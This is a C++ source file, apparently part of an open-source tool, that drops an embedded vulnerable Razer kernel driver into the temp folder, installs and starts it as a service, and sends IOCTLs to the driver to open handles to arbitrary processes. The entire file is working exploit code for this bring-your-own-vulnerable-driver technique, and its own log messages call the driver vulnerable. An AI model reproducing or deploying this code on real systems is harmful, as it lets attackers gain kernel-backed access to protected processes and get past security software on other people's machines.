/*
 * MIT License
 *
 * Copyright (c) 2020 Kento Oki
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include "razer.hpp"

bool razer::razer_init()
{
    logger::log("[>] loading vulnerable driver...\n");

    char temp_path[MAX_PATH];
    const uint32_t length = GetTempPath(sizeof(temp_path), temp_path);

    if (length > MAX_PATH || !length)
    {
        LOG_ERROR();
        return false;
    }

    //
    // place the driver binary into the temp path
    //
    const std::string placement_path = std::string(temp_path) + RAZER_DRIVER_NAME;

    if (std::filesystem::exists(placement_path))
    {
        std::remove(placement_path.c_str());
    }

    //
    // create driver sys from memory
    //
    if (!file_utils::create_file_from_buffer(
        placement_path,
        (void*)resource::raw_driver,
        sizeof(resource::raw_driver)
    ))
    {
        LOG_ERROR();
        return false;
    }

    detail::service_handle = service_utils::create_service(placement_path);

    if (!detail::service_handle)
    {
        LOG_ERROR();
        return false;
    }

    //
    // start the service
    //
    if (!service_utils::start_service(detail::service_handle))
    {
        LOG_ERROR();
        return false;
    }

    //
    // open the handle of its driver device
    //
    detail::device_handle = CreateFile(
        TEXT(RAZER_DEVICE_NAME),
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        NULL,
        NULL
    );

    if (!detail::device_handle || detail::device_handle == INVALID_HANDLE_VALUE)
    {
        LOG_ERROR();
        return false;
    }

    logger::log("[+] device handle: 0x%llX\n", detail::device_handle);
    logger::log("[<] driver initialized!\n");

    return true;
}

void razer::razer_unload()
{
    if (detail::device_handle)
    {
        CloseHandle(detail::device_handle);
    }

    if (detail::service_handle)
    {
        service_utils::stop_service(detail::service_handle);
        service_utils::delete_service(detail::service_handle);
        CloseServiceHandle(detail::service_handle);
    }
}

bool razer::send_ioctl(
    const DWORD ioctl_code,
    void* buffer, size_t buffer_size
)
{
    void* out_buffer = calloc(1, buffer_size);
    DWORD out_buffer_size = NULL;

    DeviceIoControl(
        detail::device_handle,
        ioctl_code,
        buffer,
        buffer_size,
        out_buffer,
        buffer_size,
        &out_buffer_size,
        NULL
    );

    if (!out_buffer_size)
    {
        free(out_buffer);
        return false;
    }

    memcpy(buffer, out_buffer, out_buffer_size);
    free(out_buffer);

    return true;
}

HANDLE razer::driver_impl::open_process_handle(const uint32_t process_id)
{
    RAZER_OPEN_PROCESS_HANDLE_REQUEST payload;
    payload.process_id = (uint64_t)process_id;

    if (!send_ioctl(RAZER_IOCTL_OPEN_PROCESS_HANDLE, &payload, sizeof(payload)))
    {
        LOG_ERROR();
        logger::log("[!] failed to complete the request\n");
        return INVALID_HANDLE_VALUE;
    }

    if (!payload.result || (HANDLE)payload.result == INVALID_HANDLE_VALUE)
    {
        logger::log("[!] failed to obtain process handle using vulnerable driver\n");
        return INVALID_HANDLE_VALUE;
    }

    return (HANDLE)payload.result;
}
